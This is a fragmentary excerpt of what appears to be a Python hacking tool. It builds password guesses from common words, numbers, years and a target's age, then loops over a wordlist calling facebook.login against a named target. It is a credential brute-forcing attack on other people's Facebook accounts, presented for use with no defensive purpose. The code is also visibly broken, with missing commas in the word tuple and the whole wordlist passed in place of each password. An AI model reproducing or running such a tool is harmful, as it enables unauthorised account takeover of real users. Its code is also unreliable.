...
DATA = ("handsome", "pretty", "strong", "beautiful", "12345", "1243", "2020", "123456", "654321", "0987654321", "1234567890", "happy", "sad", "456", "654", "7293", "19477", "72893", "999", "2000", "2005", "2000", "2002", "2003", "2004", "2005" "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013" "2014", "2016", "2017", "2018", "2019", "2020", "2022", "2023", "2024", "2050", "password", "Password", "@gmail.com", "_2", "10", "12", "100", "200", "300", "500", "1000", "302", "929", "0299", "000", "0123", "012", "1237","883", "123321", "32123", "200924", "200925", "dragon", "master", "grandmaster", "Gaming", "GAMING", "games", "Games", "GaMes")
...
{white}=====================================
{green}[{yellow}ONLINE{green}]{blue}>{cyan} ᯤ
...
def Info_vulnerability():
    ...
    sleep(2)
    print(" ")
    age = input(f'{green}[-]{yellow} Enter Age of a target ==> ')
    sleep(3)
    print(f'{yellow}[-] Generating Possible Password...!')
    sleep(6)
    print(" ")
    print(f'{yellow}[-] Generated Successfully..!')
    print(" ")
    sleep(3)
    print(" ")
    year_now = "2023"
...
def Start():
    ...
    while True:
        ...
        if console == "help":
            ...
            print(" ")
            print(f'{yellow}[{red}-{yellow}] about')
            print(" ")
    ...
    if wordlist:
        ...
        for passwd in passwords:
            ...
            Account = facebook.login(target, wordlist)
            print(" ")
            if Account:
                 print(" ")
